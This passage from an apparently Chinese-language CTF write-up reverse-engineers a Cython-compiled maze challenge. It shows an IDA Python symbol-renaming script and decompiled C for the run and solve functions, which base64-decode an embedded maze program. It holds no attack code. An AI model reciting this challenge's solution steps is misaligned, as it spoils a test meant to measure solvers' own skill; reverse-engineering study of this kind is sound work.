class="string">&#x27;__pyx_n_s_functions&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_gc&#x27;</span>, <span class="string">&#x27;__pyx_n_s_genexpr&#x27;</span>, <span class="string">&#x27;__pyx_n_s_group&#x27;</span>, <span class="string">&#x27;__pyx_n_u_hole&#x27;</span>, <span class="string">&#x27;__pyx_n_s_i&#x27;</span>, <span class="string">&#x27;__pyx_n_u_if&#x27;</span>, <span class="string">&#x27;__pyx_n_s_import&#x27;</span>, <span class="string">&#x27;__pyx_n_u_in&#x27;</span>, <span class="string">&#x27;__pyx_n_s_init&#x27;</span>, <span class="string">&#x27;__pyx_n_s_init_subclass&#x27;</span>, <span class="string">&#x27;__pyx_n_s_initializing&#x27;</span>, <span class="string">&#x27;__pyx_n_s_input&#x27;</span>, <span class="string">&#x27;__pyx_n_s_int&#x27;</span>, <span class="string">&#x27;__pyx_n_s_int_match&#x27;</span>, <span class="string">&#x27;__pyx_n_s_is_coroutine&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_isenabled&#x27;</span>, <span class="string">&#x27;__pyx_n_s_items&#x27;</span>, <span class="string">&#x27;__pyx_n_s_k&#x27;</span>, <span class="string">&#x27;__pyx_n_s_key&#x27;</span>, <span class="string">&#x27;__pyx_n_s_line&#x27;</span>, <span class="string">&#x27;__pyx_n_s_lower&#x27;</span>, <span class="string">&#x27;__pyx_n_s_main&#x27;</span>, <span class="string">&#x27;__pyx_n_s_match&#x27;</span>, <span class="string">&#x27;__pyx_n_s_matches&#x27;</span>, <span class="string">&#x27;__pyx_n_s_maze&#x27;</span>, <span class="string">&#x27;__pyx_kp_s_maze_py&#x27;</span>, <span class="string">&#x27;__pyx_n_s_metaclass&#x27;</span>, <span class="string">&#x27;__pyx_n_s_min&#x27;</span>, <span class="string">&#x27;__pyx_n_s_module&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_n&#x27;</span>, <span class="string">&#x27;__pyx_n_s_name&#x27;</span>, <span class="string">&#x27;__pyx_n_s_name_2&#x27;</span>, <span class="string">&#x27;__pyx_n_s_number&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_one_use&#x27;</span>, <span class="string">&#x27;__pyx_n_s_operator&#x27;</span>, <span class="string">&#x27;__pyx_n_u_out&#x27;</span>, <span class="string">&#x27;__pyx_n_s_output&#x27;</span>, <span class="string">&#x27;__pyx_n_u_path&#x27;</span>, <span class="string">&#x27;__pyx_n_s_pattern&#x27;</span>, <span class="string">&#x27;__pyx_n_s_pause&#x27;</span>, <span class="string">&#x27;__pyx_n_u_pause&#x27;</span>, <span class="string">&#x27;__pyx_n_s_popleft&#x27;</span>, <span class="string">&#x27;__pyx_n_s_pos&#x27;</span>, <span class="string">&#x27;__pyx_n_s_prepare&#x27;</span>, <span class="string">&#x27;__pyx_n_s_print&#x27;</span>, <span class="string">&#x27;__pyx_n_s_qualname&#x27;</span>, <span class="string">&#x27;__pyx_n_s_quotes&#x27;</span>, <span class="string">&#x27;__pyx_n_s_range&#x27;</span>, <span class="string">&#x27;__pyx_n_s_re&#x27;</span>, <span class="string">&#x27;__pyx_n_s_regexes&#x27;</span>, <span class="string">&#x27;__pyx_n_s_remove&#x27;</span>, <span class="string">&#x27;__pyx_n_s_removed&#x27;</span>, <span class="string">&#x27;__pyx_n_s_repr&#x27;</span>, <span class="string">&#x27;__pyx_n_s_result&#x27;</span>, <span class="string">&#x27;__pyx_n_s_return&#x27;</span>, <span class="string">&#x27;__pyx_n_s_row&#x27;</span>, <span class="string">&#x27;__pyx_n_s_run&#x27;</span>, <span class="string">&#x27;__pyx_n_s_search&#x27;</span>, <span class="string">&#x27;__pyx_n_s_self&#x27;</span>, <span class="string">&#x27;__pyx_n_s_send&#x27;</span>, <span class="string">&#x27;__pyx_n_s_set_name&#x27;</span>, <span class="string">&#x27;__pyx_n_s_signal&#x27;</span>, <span class="string">&#x27;__pyx_n_u_signal&#x27;</span>, <span class="string">&#x27;__pyx_n_s_signals&#x27;</span>, <span class="string">&#x27;__pyx_n_s_spec&#x27;</span>, <span class="string">&#x27;__pyx_n_s_split&#x27;</span>, <span class="string">&#x27;__pyx_n_s_splitlines&#x27;</span>, <span class="string">&#x27;__pyx_n_u_splitter&#x27;</span>, <span class="string">&#x27;__pyx_n_s_start&#x27;</span>, <span class="string">&#x27;__pyx_n_u_start&#x27;</span>, <span class="string">&#x27;__pyx_n_s_startswith&#x27;</span>, <span class="string">&#x27;__pyx_n_s_str_match&#x27;</span>, <span class="string">&#x27;__pyx_n_s_string&#x27;</span>, <span class="string">&#x27;__pyx_n_s_super&#x27;</span>, <span class="string">&#x27;__pyx_n_s_sys&#x27;</span>, <span class="string">&#x27;__pyx_n_s_test&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_then&#x27;</span>, <span class="string">&#x27;__pyx_n_s_then_2&#x27;</span>, <span class="string">&#x27;__pyx_n_s_then_keywd&#x27;</span>, <span class="string">&#x27;__pyx_n_s_throw&#x27;</span>, <span class="string">&#x27;__pyx_n_s_time&#x27;</span>, <span class="string">&#x27;__pyx_n_s_upper&#x27;</span>, <span class="string">&#x27;__pyx_n_s_value&#x27;</span>, <span class="string">&#x27;__pyx_n_u_wall&#x27;</span>, <span class="string">&#x27;__pyx_n_s_x&#x27;</span>, <span class="string">&#x27;__pyx_n_s_y&#x27;</span>, <span class="string">&#x27;__pyx_int_0&#x27;</span>, <span class="string">&#x27;__pyx_int_1&#x27;</span>, <span class="string">&#x27;__pyx_int_2&#x27;</span>, <span class="string">&#x27;__pyx_int_3&#x27;</span>, <span class="string">&#x27;__pyx_int_4&#x27;</span>, <span class="string">&#x27;__pyx_int_5&#x27;</span>, <span class="string">&#x27;__pyx_int_6&#x27;</span>, <span class="string">&#x27;__pyx_int_7&#x27;</span>, <span class="string">&#x27;__pyx_int_8&#x27;</span>, <span class="string">&#x27;__pyx_int_9&#x27;</span>, <span class="string">&#x27;__pyx_int_10&#x27;</span>, <span class="string">&#x27;__pyx_int_11&#x27;</span>, <span class="string">&#x27;__pyx_int_12&#x27;</span>, <span class="string">&#x27;__pyx_int_13&#x27;</span>, <span class="string">&#x27;__pyx_int_14&#x27;</span>, <span class="string">&#x27;__pyx_int_15&#x27;</span>, <span class="string">&#x27;__pyx_int_16&#x27;</span>, <span class="string">&#x27;__pyx_int_17&#x27;</span>, <span class="string">&#x27;__pyx_int_18&#x27;</span>, <span class="string">&#x27;__pyx_int_19&#x27;</span>, <span class="string">&#x27;__pyx_int_20&#x27;</span>, <span class="string">&#x27;__pyx_int_21&#x27;</span>, <span class="string">&#x27;__pyx_int_22&#x27;</span>, <span class="string">&#x27;__pyx_int_23&#x27;</span>, <span class="string">&#x27;__pyx_int_24&#x27;</span>, <span class="string">&#x27;__pyx_int_25&#x27;</span>, <span class="string">&#x27;__pyx_int_26&#x27;</span>, <span class="string">&#x27;__pyx_int_27&#x27;</span>, <span class="string">&#x27;__pyx_int_28&#x27;</span>, <span class="string">&#x27;__pyx_int_29&#x27;</span>, <span class="string">&#x27;__pyx_int_30&#x27;</span>, <span class="string">&#x27;__pyx_int_31&#x27;</span>, <span class="string">&#x27;__pyx_int_32&#x27;</span>, <span class="string">&#x27;__pyx_int_36&#x27;</span>, <span class="string">&#x27;__pyx_int_37&#x27;</span>, <span class="string">&#x27;__pyx_int_38&#x27;</span>, <span class="string">&#x27;__pyx_int_39&#x27;</span>, <span class="string">&#x27;__pyx_int_40&#x27;</span>, <span class="string">&#x27;__pyx_int_47&#x27;</span>, <span class="string">&#x27;__pyx_int_49&#x27;</span>, <span class="string">&#x27;__pyx_int_60&#x27;</span>, <span class="string">&#x27;__pyx_int_61&#x27;</span>, <span class="string">&#x27;__pyx_int_62&#x27;</span>, <span class="string">&#x27;__pyx_int_63&#x27;</span>, <span class="string">&#x27;__pyx_int_102&#x27;</span>, <span class="string">&#x27;__pyx_int_112&#x27;</span>, <span class="string">&#x27;__pyx_int_neg_1&#x27;</span>, <span class="string">&#x27;__pyx_slice__6&#x27;</span>, <span class="string">&#x27;__pyx_tuple__21&#x27;</span>, <span class="string">&#x27;__pyx_tuple__22&#x27;</span>, <span class="string">&#x27;__pyx_tuple__23&#x27;</span>, <span class="string">&#x27;__pyx_tuple__24&#x27;</span>, <span class="string">&#x27;__pyx_tuple__26&#x27;</span>, <span class="string">&#x27;__pyx_tuple__27&#x27;</span>, <span class="string">&#x27;__pyx_tuple__28&#x27;</span>, <span class="string">&#x27;__pyx_tuple__29&#x27;</span>, <span class="string">&#x27;__pyx_tuple__39&#x27;</span>, <span class="string">&#x27;__pyx_tuple__41&#x27;</span>, <span class="string">&#x27;__pyx_tuple__43&#x27;</span>, <span class="string">&#x27;__pyx_tuple__46&#x27;</span>, <span class="string">&#x27;__pyx_tuple__48&#x27;</span>, <span class="string">&#x27;__pyx_tuple__50&#x27;</span>, <span class="string">&#x27;__pyx_tuple__52&#x27;</span>, <span class="string">&#x27;__pyx_tuple__54&#x27;</span>, <span class="string">&#x27;__pyx_tuple__56&#x27;</span>, <span class="string">&#x27;__pyx_tuple__58&#x27;</span>, <span class="string">&#x27;__pyx_tuple__60&#x27;</span>, <span class="string">&#x27;__pyx_tuple__63&#x27;</span>, <span class="string">&#x27;__pyx_tuple__65&#x27;</span>, <span class="string">&#x27;__pyx_tuple__67&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__40&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__42&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__44&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__45&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__47&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__49&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__51&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__53&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__55&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__57&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__59&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__61&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__62&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__64&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__66&#x27;</span>, <span class="string">&#x27;__pyx_codeobj__68&#x27;</span>]</span><br><span class="line"></span><br><span class="line">base = <span class="number">0x44960</span>  <span class="comment"># _pyx_mstate_global_static的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;begin&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ns)):</span><br><span class="line">    create_qword(base+i*<span class="number">8</span>)</span><br><span class="line">    SetType(base+i*<span class="number">8</span>, ys[i])</span><br><span class="line">    set_name(base+i*<span class="number">8</span>, ns[i], SN_CHECK)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>执行脚本后，交叉引用得到字符串：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231214161913011.png"></p>
<p>之后往下看，猜测这里是获取solve函数，然后调用，参数应该是输入的字符串：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">v25 = (PyObject *)_pyx_dict_version<span class="number">.18832</span>;</span><br><span class="line"><span class="keyword">if</span> ( _pyx_d.__pyx_d[<span class="number">1</span>].ob_type == (_typeobject *)_pyx_dict_version<span class="number">.18832</span> )</span><br><span class="line">&#123;</span><br><span class="line">    BuiltinName = _pyx_dict_cached_value<span class="number">.18833</span>;</span><br><span class="line">    <span class="keyword">if</span> ( _pyx_dict_cached_value<span class="number">.18833</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ++_pyx_dict_cached_value<span class="number">.18833</span>-&gt;ob_refcnt;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">    &#125;</span><br><span class="line">    BuiltinName = _Pyx_GetBuiltinName(_pyx_d.__pyx_n_s_solve);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    BuiltinName = _Pyx__GetModuleGlobalName(</span><br><span class="line">        _pyx_d.__pyx_n_s_solve,</span><br><span class="line">        &amp;_pyx_dict_version<span class="number">.18832</span>,</span><br><span class="line">        &amp;_pyx_dict_cached_value<span class="number">.18833</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !BuiltinName )</span><br><span class="line">&#123;</span><br><span class="line">    v44 = <span class="number">390</span>;</span><br><span class="line">    v45 = <span class="number">15326</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">&#125;</span><br><span class="line">LABEL_19:</span><br><span class="line"><span class="keyword">if</span> ( BuiltinName-&gt;ob_type == (_typeobject *)&amp;PyMethod_Type</span><br><span class="line">    &amp;&amp; (p_ob_base = &amp;BuiltinName[<span class="number">1</span>].ob_type-&gt;ob_base.ob_base) != <span class="number">0LL</span> )</span><br><span class="line">&#123;</span><br><span class="line">    ob_refcnt = (PyObject *)BuiltinName[<span class="number">1</span>].ob_refcnt;</span><br><span class="line">    ++p_ob_base-&gt;ob_refcnt;</span><br><span class="line">    ++ob_refcnt-&gt;ob_refcnt;</span><br><span class="line">    v12 = BuiltinName-&gt;ob_refcnt-- == <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">        _Py_Dealloc(BuiltinName);</span><br><span class="line">    v27 = &amp;v58;</span><br><span class="line">    v28 = ob_refcnt;</span><br><span class="line">    v58 = p_ob_base;</span><br><span class="line">    args[<span class="number">0</span>] = v24;</span><br><span class="line">    v56 = _Pyx_PyObject_FastCallDict(ob_refcnt, &amp;v58, <span class="number">2uLL</span>, v25);</span><br><span class="line">    v12 = p_ob_base-&gt;ob_refcnt-- == <span class="number">1</span>;</span><br><span class="line">    v30 = v56;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">        v28 = p_ob_base;</span><br><span class="line">        _Py_Dealloc(p_ob_base);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v27 = args;</span><br><span class="line">    v28 = BuiltinName;</span><br><span class="line">    args[<span class="number">0</span>] = v24;</span><br><span class="line">    v58 = <span class="number">0LL</span>;</span><br><span class="line">    ob_refcnt = BuiltinName;</span><br><span class="line">    v30 = _Pyx_PyObject_FastCallDict(BuiltinName, args, <span class="number">1uLL</span>, v25);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，<code>run</code>的逻辑为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># print <span class="string">&quot;Welcome&quot;</span></span></span><br><span class="line">v8 = (PyObject *)PyObject_Call(_pyx_builtin_print, _pyx_d.__pyx_tuple__26, <span class="number">0LL</span>);</span><br><span class="line"><span class="meta"># print <span class="string">&quot;Input flag&quot;</span></span></span><br><span class="line">v19 = (_QWORD *)PyObject_Call(_pyx_builtin_print, _pyx_d.__pyx_tuple__27, <span class="number">0LL</span>);</span><br><span class="line"><span class="meta"># input</span></span><br><span class="line">v24 = _Pyx_PyObject_FastCallDict(_pyx_builtin_input, args, <span class="number">0x8000000000000000</span>LL, (PyObject *)v23);</span><br><span class="line">solve()</span><br><span class="line"><span class="keyword">if</span> ( IsTrue &gt;= <span class="number">0</span> )</span><br><span class="line">    <span class="meta"># print <span class="string">&quot;try again&quot;</span></span></span><br><span class="line">    v39 = (_QWORD *)PyObject_Call(_pyx_builtin_print, _pyx_d.__pyx_tuple__28, <span class="number">0LL</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="meta"># print <span class="string">&quot;Congratulations&quot;</span></span></span><br><span class="line">    v39 = (_QWORD *)PyObject_Call(_pyx_builtin_print, _pyx_d.__pyx_tuple__29, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>

<h4 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h4><p>再看<code>solve</code>。</p>
<p>这里根据WP，猜测是<code>MazeLang(base64.b64decoder(_pyx_n_s_UJ9mxXxeoS).decode())</code>的过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line">__pyx_L4_argument_unpacking_done:</span><br><span class="line"><span class="keyword">if</span> ( _pyx_d[<span class="number">1</span>].ob_type == (_typeobject *)_pyx_dict_version<span class="number">.18778</span> )</span><br><span class="line">&#123;</span><br><span class="line">    BuiltinName = _pyx_dict_cached_value<span class="number">.18779</span>;</span><br><span class="line">    <span class="keyword">if</span> ( _pyx_dict_cached_value<span class="number">.18779</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ++_pyx_dict_cached_value<span class="number">.18779</span>-&gt;ob_refcnt;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">    BuiltinName = _Pyx_GetBuiltinName(_pyx_n_s_base64);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    BuiltinName = _Pyx__GetModuleGlobalName(_pyx_n_s_base64, &amp;_pyx_dict_version<span class="number">.18778</span>, &amp;_pyx_dict_cached_value<span class="number">.18779</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !BuiltinName )</span><br><span class="line">&#123;</span><br><span class="line">    Attr = <span class="number">0LL</span>;</span><br><span class="line">    _Pyx_AddTraceback(<span class="string">&quot;maze.c29sdmU&quot;</span>, <span class="number">14965</span>, <span class="number">370</span>, <span class="string">&quot;maze.py&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> Attr;</span><br><span class="line">&#125;</span><br><span class="line">LABEL_10:</span><br><span class="line">tp_getattro = (__int64 (__fastcall *)(PyObject *, PyObject *))BuiltinName-&gt;ob_type-&gt;tp_getattro;</span><br><span class="line"><span class="keyword">if</span> ( tp_getattro )</span><br><span class="line">    Attr = (PyObject *)tp_getattro(BuiltinName, _pyx_n_s_b64decode);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    Attr = (PyObject *)PyObject_GetAttr(BuiltinName, _pyx_n_s_b64decode);</span><br><span class="line">v11 = BuiltinName-&gt;ob_refcnt - <span class="number">1</span>;</span><br><span class="line">BuiltinName-&gt;ob_refcnt = v11;</span><br><span class="line"><span class="keyword">if</span> ( !Attr )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v11 )</span><br><span class="line">        _Py_Dealloc(BuiltinName);</span><br><span class="line">    _Pyx_AddTraceback(<span class="string">&quot;maze.c29sdmU&quot;</span>, <span class="number">14967</span>, <span class="number">370</span>, <span class="string">&quot;maze.py&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> Attr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !v11 )</span><br><span class="line">    _Py_Dealloc(BuiltinName);</span><br><span class="line">v12 = (PyObject *)_pyx_dict_version<span class="number">.18781</span>;</span><br><span class="line"><span class="keyword">if</span> ( _pyx_d[<span class="number">1</span>].ob_type == (_typeobject *)_pyx_dict_version<span class="number">.18781</span> )</span><br><span class="line">&#123;</span><br><span class="line">    ModuleGlobalName = _pyx_dict_cached_value<span class="number">.18782</span>;</span><br><span class="line">    <span class="keyword">if</span> ( _pyx_dict_cached_value<span class="number">.18782</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ++_pyx_dict_cached_value<span class="number">.18782</span>-&gt;ob_refcnt;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    ModuleGlobalName = _Pyx_GetBuiltinName(_pyx_n_s_UJ9mxXxeoS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    ModuleGlobalName = _Pyx__GetModuleGlobalName(</span><br><span class="line">        _pyx_n_s_UJ9mxXxeoS,</span><br><span class="line">        &amp;_pyx_dict_version<span class="number">.18781</span>,</span><br><span class="line">        &amp;_pyx_dict_cached_value<span class="number">.18782</span>);</span><br><span class="line">&#125;</span><br><span class="line">v23 = <span class="number">14970</span>;</span><br><span class="line"><span class="keyword">if</span> ( !ModuleGlobalName )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_146;</span><br><span class="line">LABEL_18:</span><br><span class="line"><span class="keyword">if</span> ( Attr-&gt;ob_type == (_typeobject *)&amp;PyMethod_Type &amp;&amp; (ob_type = (PyObject **)Attr[<span class="number">1</span>].ob_type) != <span class="number">0LL</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v14 = (PyObject *)Attr[<span class="number">1</span>].ob_refcnt;</span><br><span class="line">    *ob_type = (PyObject *)((<span class="type">char</span> *)*ob_type + <span class="number">1</span>);</span><br><span class="line">    ++v14-&gt;ob_refcnt;</span><br><span class="line">    v16 = Attr-&gt;ob_refcnt-- == <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">        _Py_Dealloc(Attr);</span><br><span class="line">    __pyx_pyargnames[<span class="number">0</span>] = ob_type;</span><br><span class="line">    __pyx_pyargnames[<span class="number">1</span>] = (PyObject **)ModuleGlobalName;</span><br><span class="line">    v81 = _Pyx_PyObject_FastCallDict(v14, (PyObject **)__pyx_pyargnames, <span class="number">2uLL</span>, v12);</span><br><span class="line">    v16 = *ob_type == (PyObject *)((<span class="type">char</span> *)&amp;dword_0 + <span class="number">1</span>);</span><br><span class="line">    *ob_type = (PyObject *)((<span class="type">char</span> *)*ob_type - <span class="number">1</span>);</span><br><span class="line">    v15 = v81;</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">        _Py_Dealloc(ob_type);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v14 = Attr;</span><br><span class="line">    __pyx_pyargnames[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">    __pyx_pyargnames[<span class="number">1</span>] = (PyObject **)ModuleGlobalName;</span><br><span class="line">    v15 = _Pyx_PyObject_FastCallDict(Attr, (PyObject **)&amp;__pyx_pyargnames[<span class="number">1</span>], <span class="number">1uLL</span>, v12);</span><br><span class="line">&#125;</span><br><span class="line">v16 = ModuleGlobalName-&gt;ob_refcnt-- == <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( v16 )</span><br><span class="line">    _Py_Dealloc(ModuleGlobalName);</span><br><span class="line"><span class="keyword">if</span> ( !v15 )</span><br><span class="line">&#123;</span><br><span class="line">    Attr = v14;</span><br><span class="line">    v23 = <span class="number">14991</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_146;</span><br><span class="line">&#125;</span><br><span class="line">v16 = v14-&gt;ob_refcnt-- == <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( v16 )</span><br><span class="line">    _Py_Dealloc(v14);</span><br><span class="line">v17 = (__int64 (__fastcall *)(PyObject *, PyObject *))v15-&gt;ob_type-&gt;tp_getattro;</span><br><span class="line"><span class="keyword">if</span> ( v17 )</span><br><span class="line">    v19 = (PyObject *)v17(v15, _pyx_n_s_decode);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    v19 = (PyObject *)PyObject_GetAttr(v15, _pyx_n_s_decode);</span><br><span class="line">v20 = v15-&gt;ob_refcnt - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( !v19 )</span><br><span 